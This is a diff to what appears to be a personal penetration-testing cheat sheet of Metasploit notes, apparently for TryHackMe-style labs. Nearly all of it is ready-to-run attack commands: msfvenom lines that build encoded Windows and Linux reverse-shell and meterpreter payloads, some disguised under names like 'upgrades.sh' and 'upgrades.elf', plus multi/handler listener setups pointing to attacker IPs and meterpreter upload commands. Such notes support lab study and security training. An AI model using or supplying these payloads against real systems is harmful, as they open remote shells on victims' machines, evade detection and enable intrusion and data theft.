@@ -51,18 +51,22 @@ incognito - allows user token impersonation
 ## Shells 
 windows:  
 ex msfvenom reverse shell:  
-`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`
+* `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`
 ex msfconsole listener:  
-`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`
+* `use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`
 
 Linux:  
 ex msfvenom:  
-`msfvenom -p cmd/linux/http/x86/shell/reverse_tcp --encoder x86/shikata_ga_nai LHOST=10.13.53.1 LPORT=8888 -f sh -o upgrades.sh` 
-`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.13.53.1 LPORT=8888 -f elf > reverse.elf `
-`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > meterpreter.elf`
+* `msfvenom -p cmd/linux/http/x86/shell/reverse_tcp --encoder x86/shikata_ga_nai LHOST=10.13.53.1 LPORT=8888 -f sh -o upgrades.sh`   
+* `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.13.53.1 LPORT=8888 -f elf > reverse.elf `  
+* `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > meterpreter.elf`  
 ex msfconsole: 
-`use exploit/multi/handler set PAYLOAD cmd/linux/http/x86/shell/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`
-`use exploit/multi/handler set PAYLOAD /linux/x86/shell_reverse_tcp set LHOST <ip> LPORT 8888 run`
+* `use exploit/multi/handler set PAYLOAD cmd/linux/http/x86/shell/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`  
+* `use exploit/multi/handler set PAYLOAD /linux/x86/shell_reverse_tcp set LHOST <ip> LPORT 8888 run`
 ## Meterpreter
 `channel -i <session>` - attaches
 `upload <file>` - uploads file
+
+payloads:
+* `msfvenom -p linux/x86/meterpreter/reverse_tcp --encoder x86/shikata_ga_nai LHOST=10.10.14.156 LPORT=8888 -f elf -o upgrades.elf`
+* `msfvenom -p linux/x86/meterpreter/reverse_tcp --encoder x86/shikata_ga_nai LHOST=tun0 LPORT=8888 -f sh -o upgrades.sh`
